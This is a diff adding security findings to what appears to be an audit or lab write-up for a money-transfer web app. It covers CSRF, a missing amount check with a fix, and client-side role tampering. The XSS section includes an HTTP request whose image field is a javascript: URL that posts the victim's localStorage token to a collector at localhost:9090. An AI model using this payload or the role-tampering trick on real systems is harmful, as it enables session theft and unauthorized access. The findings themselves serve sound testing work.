@@ -88,3 +88,42 @@ brokerRouter.post((req, res, next) => {
 
 brokerRouter.post("*", (req, res, next) => {
 ```
+
+It should be noted that while this theoretically makes CSRF attacks possible, credentials are not stored in cookies, so the impact is limited.
+
+## Validation Issue
+
+Amount validation is missing from the `/transfer` endpoint, negative transfers are possible.
+
+Fix:
+
+```js
+if (amount <= 0)
+    return res.status(400).json({ error: "Invalid amount" });
+```
+
+## Injection / XSS
+
+The following leads to XSS when clicking a transaction:
+See also: [xss-image.rest](xss-image.rest)
+
+```http
+POST {{baseurl}}/broker/transfer
+Authorization: Bearer {{access_token}}
+Content-Type: application/json
+
+{
+    "peer": "admin",
+    "amount": 1,
+    "image": "javascript:fetch('<http://localhost:9090/log',{method:'POST',body:localStorage.getItem('token')}>);",
+    "csrf": "{{csrfRequest.response.body.$.csrf}}"
+}
+```
+
+Without using this javascript: url-pattern, an attacker can still de-anonymize our users by using external urls.
+
+## Client issues
+
+When manually editing the localStorage to obtain the "admin" role, the user can access the `/admin/users` page.
+On this page, the user can see all users and their roles.
+When the access control vulnerability is fixed, the user is rewarded with the password of the "john" user.
